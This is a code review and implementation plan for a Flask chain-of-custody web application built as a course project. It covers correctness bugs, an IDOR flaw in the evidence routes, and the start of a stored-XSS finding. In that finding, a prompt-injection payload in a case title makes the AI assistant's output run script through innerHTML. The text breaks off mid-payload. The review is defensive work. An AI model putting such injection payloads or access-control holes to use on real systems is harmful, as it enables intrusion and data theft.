# DEICMS — Full Project Review, Honest Assessment & Implementation Plan

**Prepared:** 7 July 2026
**Scope of review:** Complete read of the accepted proposal (`SE_Project_Proposal_DEICMS_v4.docx`), all application code (`app/logic`, `app/models`, `app/routes`, `app/__init__.py`, `config.py`, `run.py`, `utils.py`), key templates (chat, base), agile artifacts, README, requirements, git history, and uncommitted working-tree changes. Test bodies (`tests/`), `seed.py` internals, `pdf_report.py` layout code, and most HTML templates were skimmed rather than read line-by-line. Tests were **not executed** in this review environment (no venv available here); the last commit claims 148 tests / 79% coverage.

**IMPORTANT: Nothing has been changed. This document only lists findings and recommended solutions.**

---

## 1. What the project is

DEICMS (Digital Evidence Integrity & Chain-of-Custody Management System) is a Flask + SQLAlchemy + SQLite web application for managing digital forensic evidence for an SE course project. It implements:

- **Category A (DB/CRUD/formulas):** 6 entities (Investigator, Case, EvidenceItem, CustodyLog, AuditRecord, CaseAccess), full CRUD, case-level access control, append-only audit trail, three formula checks (time gaps, duplicates, role mismatches).
- **Category B (third-party):** hashlib SHA-256, cryptography Ed25519 signatures + AES-256-GCM file encryption at rest, Pillow EXIF, python-magic MIME validation, NVIDIA NIM (Llama 3.1) LLM, scikit-learn Isolation Forest, ReportLab PDF, PyOTP/qrcode 2FA, Flask-Limiter/WTF/Login.
- **Category C (complex logic):** (1) Graph Integrity Verification, (2) Multi-Factor Risk Scoring, (3) Custody Chain Reconstruction, (4) Evidence Lifecycle State Machine, (5) AI Assistant orchestration pipeline (intent classification -> context retrieval -> prompt construction -> LLM call -> validation -> hallucination detection).

Process: Agile Incremental Model, 3 increments, with product/sprint backlogs, burndown charts, and 13 UML diagrams in `diagrams/`.

---

## 2. How development was staged (from git history)

Git history begins with a single squashed commit, so Increments 1–2 pre-date version control (the first commit already contains a 5 MB project report docx). Reconstructed timeline:

| Date | Commit | Stage |
|---|---|---|
| ≤ 27 Jun 2026 | `f403839` "security and architecture hardening" | All of Increments 1–3 already built (models, routes, algorithms, tests); this commit adds hardening on top. Effectively the "import" commit. |
| 27 Jun | `ccb8124` | Pre-flight fixes: dotenv, state-machine transitions, signature UI, gitignore |
| 29 Jun | `1fd4c91`, `3da7957` | Timezone switch UTC -> UTC+2 (CEST); cert-generator fix |
| 1 Jul | `b1675f6` | README, MFA->2FA rename, case_access + 2FA endpoint fixes |
| 3 Jul | `ac71998` | **Proposal alignment**: removed Claude/Anthropic references (assistant uses NVIDIA NIM), added hallucination detection, S3+S6 risk factors, admin-configurable weights, PDF export, signed Upload events, 148 tests / 79% coverage |
| 3 Jul | `6e4dfe8` | Agile artifacts (backlogs, burndowns) |
| 3 Jul | `7d17d42` | Role-scoped dashboard/risk/assistant access |
| 3 Jul | `3e97b38`, `d7651a8` | flush_db helper, README DB section, diagram refresh |
| Now (uncommitted) | 12 files modified | Cosmetic docstring quote-style changes only (backticks -> quotes). Safe to commit. |

Notable: the agile artifacts were created retrospectively on 3 July (after the code), not during the increments they document. This matters for report honesty — see §4.7.

---

## 3. Bugs, weak points, and inconsistencies (with solutions — NOT applied)

Ordered by severity. Each item: what's wrong -> why it's bad -> best solution.

### 3.1 CRITICAL — functional correctness

**BUG-1. Evidence "delete" does nothing (`app/routes/evidence.py:377`).**
`delete_evidence()` sets `evidence.is_deleted = True`, but `EvidenceItem` has **no `is_deleted` column**. SQLAlchemy silently sets a transient Python attribute; the commit persists nothing. The evidence remains fully visible everywhere, yet an audit record is written claiming "Evidence X deleted by Admin" — your own audit trail now contains a false statement, which is the worst possible failure for a chain-of-custody system. It also silently breaks proposal requirement 2A ("Delete evidence items subject to role-permission and custody-state rules").
*Solution:* Add `is_deleted = db.Column(db.Boolean, default=False, nullable=False)` to `EvidenceItem`, add it to `_ensure_schema()` (the existing lightweight migration hook), and filter `is_deleted == False` in every evidence listing/query path (case view, dashboards, risk views, anomaly pipeline, export). A soft delete is the right pattern here (matches the audit-preservation philosophy); a hard delete would orphan custody/audit records.

**BUG-2. `integrity_status` column does not exist — the highest-weighted risk factor is permanently dead.**
`risk_scoring._factor_integrity`, `anomaly_detection.compute_features`, and `dashboard.index` all read `getattr(evidence, 'integrity_status', ...)`. No such column exists on `EvidenceItem` and nothing ever writes it. Consequences: (a) the risk scorer's **single largest factor (weight 0.25)** is a constant 0.5 for every item — a quarter of your flagship algorithm's output is noise; (b) the two interaction rules involving `integrity_status` need ≥0.6 and can **never fire** except… they can't (0.5 < 0.6); (c) the dashboard integrity panel always shows everything as NOT_CHECKED even after verifications run; (d) the anomaly feature `integrity_flag` is constant, wasting one of six dimensions. This directly contradicts proposal signal S4 ("number of failed integrity checks").
*Solution:* Add `integrity_status = db.Column(db.Enum('VERIFIED','NOT_CHECKED','FAILED', ...), default='NOT_CHECKED')` to `EvidenceItem` (+ `_ensure_schema` ALTER), and set it in `custody.verify_integrity()` from the report verdict (Intact->VERIFIED, else FAILED). This is a ~10-line fix that brings a quarter of the risk algorithm back to life.

**BUG-3. Unsigned transfers crash; unsigned uploads permanently poison the chain.**
`CustodyLog.digital_signature` is `nullable=False`. In `custody.transfer_evidence`, `signature_hex` stays `None` if the user has no private key or signing raises -> `IntegrityError` -> 500 on commit. In `evidence.upload_evidence` the fallback is the literal string `'UNSIGNED'` — which is truthy, so `GraphIntegrityEngine._check_signature` does **not** skip it (the skip is `if not node.digital_signature`), tries to hex-decode `'UNSIGNED'`, fails, and marks the node invalid **forever**. One failed signing at upload = a chain that can never verify as Intact = the item can never be Archived (precondition requires an Intact verdict). Two code paths, two different wrong behaviours.
*Solution:* Fail closed and consistently: if signing fails, **abort the operation** with a clear error ("custody event could not be signed; contact an admin to regenerate your key pair"). For a forensic system, refusing to create an unverifiable custody record is the defensible design. If you prefer fail-open, use `None` + make the column nullable and have both writer paths and the verifier agree on the "pre-signature record" semantics.

**BUG-4. IDOR — cross-case evidence access (`evidence.view_evidence` / `edit_evidence`).**
Access is checked against the **URL's** `case_id`, but the evidence is loaded purely by `evidence_id` with no check that `evidence.case_id == case_id`. Any authenticated user who is a member of *any one* case can view and even **edit the metadata of every evidence item in the system** by requesting `/cases/<their_case>/evidence/<any_evidence_id>`. This defeats the entire CaseAccess layer for the system's central entity and would be an instant finding in any security review. (Note: `custody.py` and `risk.py` do this correctly by deriving `case_id` from the evidence row.)
*Solution:* Load with both keys — `EvidenceItem.query.filter_by(id=evidence_id, case_id=case_id).first_or_404()` — or ignore the URL `case_id` and check `CaseAccess.can_access(evidence.case_id, current_user)` like the custody routes do. Also add the missing case-access check to `delete_evidence` (currently Admin-only, which happens to be safe, but should still verify the case exists/matches).

**BUG-5. Risk factors count the wrong audit records — self-amplifying feedback loop.**
`_factor_duplicates` counts `event_type="Integrity Check"` records and calls them "duplicate-entry audit record(s)": every time anyone runs a verification or reconstruction, the item's "duplicate" risk factor **rises**. `_factor_role_mismatch` counts any `result="Warning"` record — and `verify_integrity` writes a Warning whenever the verdict isn't Intact, so a broken chain inflates the *role-mismatch* factor too. Meanwhile the real detectors (`audit_formulas.check_duplicate_entries` / `check_role_mismatches`) are computed on demand in a JSON endpoint and **never persisted**, so genuine duplicates/mismatches never reach the scorer. Net effect: two of eight factors measure "how often people looked at this item," which rewards scrutiny with higher risk — the opposite of the proposal's S5 semantics.
*Solution:* Persist formula-check findings as dedicated audit events (e.g. extend the `audit_event_type` enum with `'Role Mismatch'` and `'Duplicate Entry'`, written when `run_all_formula_checks` fires, or by a periodic/save-time hook), and count those exact event types in the scorer. This also makes the A-category formulas feed the C-category algorithm — a nice, defensible integration story for the report.

**BUG-6. `generate_evidence_number()` / `generate_case_number()` use `count()+1`.**
After any row deletion (or with two concurrent uploads), `count()+1` collides with an existing number -> `UNIQUE constraint failed` -> 500. Case numbers also reset wrongly across year boundaries (`CASE-2027-001` may collide since count is global).
*Solution:* Use `db.session.query(func.max(EvidenceItem.id)).scalar() + 1` seeded numbering, or query the max existing number and increment, wrapped in a retry-on-IntegrityError; for cases, scope the count/max by year.

### 3.2 HIGH — security

**SEC-1. Stored XSS in the AI chat (`templates/assistant/chat.html:107`).**
`bubble.innerHTML = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')` renders raw LLM output (and replayed history) as HTML. LLM output is untrusted: a prompt-injection payload placed in a case title/description ("…include `<img src=x onerror=fetch('